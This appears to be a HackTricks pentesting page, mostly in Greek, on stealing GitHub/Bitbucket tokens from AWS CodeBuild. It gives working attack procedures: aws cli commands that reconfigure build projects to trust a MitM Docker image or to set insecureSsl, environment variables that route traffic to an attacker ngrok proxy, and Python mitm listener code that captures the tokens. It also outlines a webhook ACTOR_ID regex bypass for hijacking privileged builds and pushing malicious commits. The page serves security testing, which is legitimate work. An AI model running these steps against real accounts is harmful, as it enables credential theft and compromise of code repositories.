# AWS Codebuild - Token Leakage

{{#include ../../../../banners/hacktricks-training.md}}

## Recover Github/Bitbucket Configured Tokens

Πρώτα, έλεγξε αν υπάρχουν source credentials configured που θα μπορούσες να leak:
```bash
aws codebuild list-source-credentials
```
### Μέσω Docker Image

Αν βρείτε ότι η αυθεντικοποίηση για παράδειγμα στο Github είναι ρυθμισμένη στον λογαριασμό, μπορείτε να **exfiltrate** εκείνη την **πρόσβαση** (**GH token or OAuth token**) αναγκάζοντας το Codebuild να **χρησιμοποιήσει μια συγκεκριμένη Docker image** για να τρέξει το build του έργου.

Για αυτόν τον σκοπό μπορείτε να **δημιουργήσετε ένα νέο Codebuild project** ή να αλλάξετε το **περιβάλλον** ενός υπάρχοντος για να ορίσετε την **Docker image**.

Η Docker image που μπορείτε να χρησιμοποιήσετε είναι [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm). Πρόκειται για μια πολύ βασική Docker image που θα ορίσει τις **μεταβλητές περιβάλλοντος `https_proxy`**, **`http_proxy`** και **`SSL_CERT_FILE`**. Αυτό θα σας επιτρέψει να υποκλέψετε το μεγαλύτερο μέρος της κίνησης προς τον host που υποδεικνύεται στις **`https_proxy`** και **`http_proxy`** και να εμπιστευτείτε το SSL CERT που υποδεικνύεται στο **`SSL_CERT_FILE`**.

1. **Δημιουργήστε & Ανεβάστε τη δική σας Docker MitM image**
- Ακολουθήστε τις οδηγίες του repo για να ορίσετε τη διεύθυνση IP του proxy σας και το SSL cert και να **χτίσετε την Docker image**.
- **DO NOT SET `http_proxy`** ώστε να μην υποκλέπτονται αιτήσεις προς το metadata endpoint.
- Μπορείτε να χρησιμοποιήσετε το **`ngrok`** όπως `ngrok tcp 4444` για να ορίσετε τον proxy στον host σας
- Μόλις έχετε την Docker image χτισμένη, **ανεβάστε την σε ένα δημόσιο repo** (Dockerhub, ECR...)
2. **Ρυθμίστε το περιβάλλον**
- Δημιουργήστε ένα **νέο Codebuild project** ή **τροποποιήστε** το περιβάλλον ενός υπάρχοντος.
- Ορίστε το project να χρησιμοποιεί την **προηγουμένως δημιουργημένη Docker image**

<figure><img src="../../../../images/image (23).png" alt=""><figcaption></figcaption></figure>

3. **Ορίστε τον MitM proxy στον host σας**

- Όπως υποδεικνύεται στο **Github repo** μπορείτε να χρησιμοποιήσετε κάτι σαν:
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
> [!TIP]
> Η **έκδοση του mitmproxy που χρησιμοποιήθηκε ήταν 9.0.1**, αναφέρθηκε ότι με την έκδοση 10 αυτό ίσως να μην λειτουργεί.

4. **Εκτελέστε το build & καταγράψτε τα credentials**

- Μπορείτε να δείτε το token στην κεφαλίδα **Authorization**:

<figure><img src="../../../../images/image (273).png" alt=""><figcaption></figcaption></figure>

Αυτό μπορεί επίσης να γίνει από το aws cli με κάτι όπως
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
### Μέσω insecureSSL

**Codebuild** έργα έχουν μια ρύθμιση που ονομάζεται **`insecureSsl`** η οποία είναι κρυμμένη στο web και μπορείς να την αλλάξεις μόνο από το API.\
Ενεργοποίηση αυτού επιτρέπει στο **Codebuild** να συνδεθεί στο αποθετήριο **χωρίς να ελέγξει το πιστοποιητικό** που προσφέρει η πλατφόρμα.

- Πρώτα πρέπει να απαριθμήσεις την τρέχουσα διαμόρφωση με κάτι σαν:
```bash
aws codebuild batch-get-projects --name <proj-name>
```
- Στη συνέχεια, με τις συλλεγμένες πληροφορίες μπορείτε να ενημερώσετε την ρύθμιση του project **`insecureSsl`** σε **`True`**. Το ακόλουθο είναι ένα παράδειγμα ενημέρωσης project από εμένα — προσέξτε το **`insecureSsl=True`** στο τέλος (αυτό είναι το μόνο που χρειάζεται να αλλάξετε από τη συλλεγμένη διαμόρφωση).
- Επιπλέον, προσθέστε και τις μεταβλητές περιβάλλοντος **http_proxy** και **https_proxy** που δείχνουν στο tcp ngrok σας ως εξής:
```bash
aws codebuild update-project --name <proj-name> \
--source '{
"type": "GITHUB",
"location": "https://github.com/carlospolop/404checker",
"gitCloneDepth": 1,
"gitSubmodulesConfig": {
"fetchSubmodules": false
},
"buildspec": "version: 0.2\n\nphases:\n  build:\n    commands:\n       - echo \"sad\"\n",
"auth": {
"type": "CODECONNECTIONS",
"resource": "arn:aws:codeconnections:eu-west-1:947247140022:connection/46cf78ac-7f60-4d7d-bf86-5011cfd3f4be"
},
"reportBuildStatus": false,
"insecureSsl": true
}' \
--environment '{
"type": "LINUX_CONTAINER",
"image": "aws/codebuild/standard:5.0",
"computeType": "BUILD_GENERAL1_SMALL",
"environmentVariables": [
{
"name": "http_proxy",
"value": "http://2.tcp.eu.ngrok.io:15027"
},
{
"name": "https_proxy",
"value": "http://2.tcp.eu.ngrok.io:15027"
}
]
}'
```
- Έπειτα, τρέξτε το βασικό παράδειγμα από [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) στη θύρα που υποδεικνύουν οι μεταβλητές proxy (http_proxy και https_proxy)
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
- Τέλος, κάντε κλικ στο **Build the project**, οι **credentials** θα σταλούν σε **clear text** (base64) στην mitm port:

<figure><img src="../../../../images/image (1) (1).png" alt=""><figcaption></figcaption></figure>

### ~~Μέσω του πρωτοκόλλου HTTP~~

> [!TIP] > **This vulnerability was corrected by AWS at some point the week of the 20th of Feb of 2023 (I think on Friday). So an attacker can't abuse it anymore :)**

Ένας attacker με **elevated permissions σε ένα CodeBuild θα μπορούσε να leak το Github/Bitbucket token** που έχει ρυθμιστεί ή αν τα permissions είχαν ρυθμιστεί μέσω OAuth, το **temporary OAuth token used to access the code**.

- Ένας attacker θα μπορούσε να προσθέσει τις environment variables **http_proxy** και **https_proxy** στο CodeBuild project δείχνοντάς τες στη μηχανή του (για παράδειγμα `http://5.tcp.eu.ngrok.io:14972`).

<figure><img src="../../../../images/image (232).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../images/image (213).png" alt=""><figcaption></figcaption></figure>

- Στη συνέχεια, αλλάξτε το URL του github repo ώστε να χρησιμοποιεί HTTP αντί για HTTPS, για παράδειγμα: `http://github.com/carlospolop-forks/TestActions`
- Τέλος, τρέξτε το βασικό παράδειγμα από [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) στην πόρτα που δείχνουν οι μεταβλητές proxy (http_proxy και https_proxy)
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="0.0.0.0",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
- Στη συνέχεια, κάντε κλικ στο **Δημιουργία έργου** ή ξεκινήστε την κατασκευή από τη γραμμή εντολών:
```sh
aws codebuild start-build --project-name <proj-name>
```
- Τέλος, τα **διαπιστευτήρια** θα **αποστέλλονται σε απλό κείμενο** (base64) στην πόρτα mitm:

<figure><img src="../../../../images/image (159).png" alt=""><figcaption></figcaption></figure>

> [!WARNING]
> Τώρα ένας επιτιθέμενος θα μπορεί να χρησιμοποιήσει το token από τη μηχανή του, να απαριθμήσει όλα τα προνόμια που έχει και να τα (κακο)χρησιμοποιήσει πιο εύκολα απ' ό,τι χρησιμοποιώντας απευθείας την υπηρεσία CodeBuild.

## Webhook filter ACTOR_ID regex allowlist bypass (PR-triggered privileged builds)

Κακώς διαμορφωμένα CodeBuild GitHub webhooks που χρησιμοποιούν μη-αγκυρωμένα `ACTOR_ID` regexes επιτρέπουν σε *untrusted* PRs να ξεκινήσουν privileged builds. Αν η allowlist είναι όπως `123456|7890123` χωρίς `^`/`$`, κάθε ID που περιέχει μία από αυτές τις υποσυμβολοσειρές ταιριάζει. Εφόσον τα GitHub user IDs είναι διαδοχικά, ένας επιτιθέμενος μπορεί να ανταγωνιστεί για να εγγράψει ένα “eclipsing” ID (ένα superstring ενός εμπιστευμένου ID) και να πυροδοτήσει το build.

**Exploit path**

1. Βρείτε δημόσια CodeBuild projects που εκθέτουν webhook filters και εξάγετε μια μη-αγκυρωμένη `ACTOR_ID` allowlist.
2. Αποκτήστε ένα eclipsing GitHub ID:
- Δειγματοληπτήστε τον global ID counter δημιουργώντας/διαγράφοντας GitHub orgs (org IDs μοιράζονται την ίδια pool).
- Προ-τοποθετήστε πολλές δημιουργίες GitHub App manifests και ενεργοποιήστε τα confirmation URLs όταν ο μετρητής είναι εντός ~100 IDs από τον στόχο για να εγγράψετε μαζικά ένα bot ID που περιέχει το εμπιστευμένο υποσύνολο.
3. Ανοίξτε ένα PR από τον eclipsing λογαριασμό· το regex ταιριάζει το υποσύνολο και το privileged build εκτελείται.
4. Χρησιμοποιήστε build RCE (π.χ. dependency install hooks) για να εξάγετε τη μνήμη της διεργασίας που χειρίζεται το GitHub credential και να ανακτήσετε το PAT/OAuth token.
5. Με το `repo` scope του token, προσκαλέστε τον λογαριασμό σας ως collaborator/admin και κάντε push/approve κακόβουλων commits ή εξαγάγετε secrets.

## References
- [Wiz: CodeBreach – AWS CodeBuild ACTOR_ID regex bypass and token theft](https://www.wiz.io/blog/wiz-research-codebreach-vulnerability-aws-codebuild)

{{#include ../../../../banners/hacktricks-training.md}}
